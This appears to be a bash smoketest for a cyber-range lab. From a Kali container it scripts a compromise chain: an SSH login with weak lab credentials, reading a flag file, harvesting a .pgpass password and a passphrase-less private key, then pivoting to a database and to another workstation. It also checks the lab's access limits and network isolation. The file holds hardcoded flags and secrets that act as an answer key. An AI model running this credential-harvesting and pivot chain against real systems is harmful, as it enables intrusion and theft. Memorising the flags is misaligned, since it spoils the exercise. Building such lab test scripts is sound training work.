#!/usr/bin/env bash
# A16 Research Data Analyst Workstation smoketest.
#
# Runs the full flag 38 compromise chain (SSH -> read ANALYST_TOKEN) and
# verifies the downstream pivots (A16 -> A8 psql, A16 -> A6 research-analyst
# ssh) from inside a14-kali. Does NOT docker-exec into A16 itself.
#
# Usage (from the range host):
#     docker cp smoketest.sh a14-kali:/tmp/a16-smoke.sh
#     docker exec a14-kali bash /tmp/a16-smoke.sh

set -u

HOST="${A16_HOST:-analyst01.boreas.local}"
USER_SHAH="${A16_USER:-p.shah}"
PASS_SHAH="${A16_PASS:-Welcome1}"

EXPECTED_FLAG_38="FLAG{8b2d4f1a0c5e7396}"

FAIL=0
pass() { echo "  [PASS] $1"; }
fail() { echo "  [FAIL] $1"; FAIL=1; }

echo "A16 smoketest - target=$HOST user=$USER_SHAH"

echo
echo "--- Reachability (corporate-face: SSH + Research Dashboard) ---"
code=$(curl -s -o /dev/null -w '%{http_code}' "http://$HOST:8080/" --max-time 4)
[[ "$code" == "200" ]] && pass "Research Dashboard served on :8080" || fail "dashboard returned $code"

dash_body=$(curl -s "http://$HOST:8080/" --max-time 4)
grep -q 'Research Ops' <<<"$dash_body" && pass "dashboard mentions Research Ops" || fail "dashboard missing Research Ops"
grep -q 'p.shah' <<<"$dash_body" && pass "dashboard footer breadcrumbs p.shah contact" || fail "dashboard missing shah contact"

ssh_shah() {
    sshpass -p "$PASS_SHAH" ssh \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 -o BatchMode=no \
        "$USER_SHAH@$HOST" "$1" 2>&1
}

echo
echo "--- Flag 38 step 1: SSH foothold as p.shah / Welcome1 ---"
whoami_out=$(ssh_shah "whoami")
grep -qx "$USER_SHAH" <<<"$whoami_out" && pass "SSH login succeeds" || fail "SSH login failed (got '$whoami_out')"

echo
echo "--- Flag 38 step 2: read ANALYST_TOKEN flag ---"
tok=$(ssh_shah "cat ~/.reports/ANALYST_TOKEN 2>/dev/null")
grep -qF "$EXPECTED_FLAG_38" <<<"$tok" && pass "flag 38 present in ANALYST_TOKEN" || fail "flag 38 missing (got '$tok')"

echo
echo "--- Shah's pivot loot: .pgpass + SSH key + config ---"
pgpass=$(ssh_shah "cat ~/.pgpass 2>/dev/null")
grep -q 'lab_general:LabGen2025!' <<<"$pgpass" && pass ".pgpass has lab_general cred" || fail ".pgpass missing lab_general"
sshkey_head=$(ssh_shah "head -1 ~/.ssh/id_rsa 2>/dev/null")
grep -q 'BEGIN.*PRIVATE KEY' <<<"$sshkey_head" && pass ".ssh/id_rsa present (passphrase-less private key)" || fail "id_rsa missing"
sshcfg=$(ssh_shah "cat ~/.ssh/config 2>/dev/null")
grep -q 'Host eng-ws01' <<<"$sshcfg" && pass ".ssh/config has eng-ws01 alias" || fail "ssh_config missing eng-ws01"
report=$(ssh_shah "head -5 ~/reports/daily_integration_report.py 2>/dev/null")
grep -q 'daily_integration_report' <<<"$report" && pass "reports/daily_integration_report.py present" || fail "report script missing"

echo
echo "--- Pivot 1: A16 -> A8 psql as lab_general ---"
pg_out=$(ssh_shah "psql -h researchdb.boreas.local -U lab_general -d postgres -tAc 'SELECT 1' 2>&1")
grep -q '^1$' <<<"$pg_out" && pass "A16 -> A8 psql works with .pgpass" || fail "A16 -> A8 psql failed: $pg_out"

echo
echo "--- Pivot 2: A16 -> A6 SSH as research-analyst via cached key ---"
a6_who=$(ssh_shah "ssh -F ~/.ssh/config -o ConnectTimeout=5 eng-ws01 'whoami' 2>&1")
grep -qx 'research-analyst' <<<"$a6_who" && pass "A16 -> A6 ssh as research-analyst works" || fail "A16 -> A6 ssh failed: $a6_who"

echo
echo "--- A6 research-analyst read scope (must match design) ---"
can_builds=$(ssh_shah "ssh -F ~/.ssh/config eng-ws01 'ls /opt/builds/latest/ 2>&1' 2>&1")
grep -q 'reactor_interface_spec' <<<"$can_builds" && pass "research-analyst can read /opt/builds/latest/" || fail "cannot read /opt/builds/latest/: $can_builds"
can_standard=$(ssh_shah "ssh -F ~/.ssh/config eng-ws01 'ls /home/r.tanaka/simulations/standard/ 2>&1 | head -3' 2>&1")
grep -q 'stress_test' <<<"$can_standard" && pass "research-analyst can read tanaka/standard/" || fail "cannot read tanaka/standard/: $can_standard"
can_deleted=$(ssh_shah "ssh -F ~/.ssh/config eng-ws01 'ls /tmp/.deleted/ 2>&1' 2>&1")
grep -q 'full_integration_sim' <<<"$can_deleted" && pass "research-analyst can read /tmp/.deleted/ (flag 30 on-ramp)" || fail "cannot read /tmp/.deleted/: $can_deleted"

cannot_midnight=$(ssh_shah "ssh -F ~/.ssh/config eng-ws01 'ls /home/r.tanaka/simulations/midnight/ 2>&1' 2>&1")
grep -q 'Permission denied' <<<"$cannot_midnight" && pass "research-analyst BLOCKED from midnight/ (correct)" || fail "midnight/ incorrectly readable: $cannot_midnight"
cannot_nielsen=$(ssh_shah "ssh -F ~/.ssh/config eng-ws01 'ls /home/p.nielsen/designs/ 2>&1' 2>&1")
grep -q 'Permission denied' <<<"$cannot_nielsen" && pass "research-analyst BLOCKED from nielsen/designs/ (correct)" || fail "nielsen/designs/ incorrectly readable: $cannot_nielsen"
cannot_jenkins=$(ssh_shah "ssh -F ~/.ssh/config eng-ws01 'cat /home/jenkins/.credentials 2>&1' 2>&1")
grep -q 'Permission denied' <<<"$cannot_jenkins" && pass "research-analyst BLOCKED from jenkins/.credentials (correct)" || fail "jenkins/.credentials incorrectly readable: $cannot_jenkins"

echo
echo "--- Isolation: A16 cannot see scada or bunker-ot ---"
iso_scada=$(ssh_shah "python3 -c \"import socket; s = socket.socket(); s.settimeout(2); s.connect(('172.20.40.10', 502)); print('reach')\" 2>&1")
grep -q 'reach' <<<"$iso_scada" && fail "A16 can reach scada VLAN 40 (should not)" || pass "A16 -> scada unreachable (correct)"
iso_bunker=$(ssh_shah "python3 -c \"import socket; s = socket.socket(); s.settimeout(2); s.connect(('172.20.50.5', 22)); print('reach')\" 2>&1")
grep -q 'reach' <<<"$iso_bunker" && fail "A16 can reach bunker-ot (should not)" || pass "A16 -> bunker unreachable (correct)"

echo
if (( FAIL == 0 )); then
    echo "A16 smoketest: PASS"
    exit 0
else
    echo "A16 smoketest: FAIL ($FAIL failure(s))"
    exit 1
fi
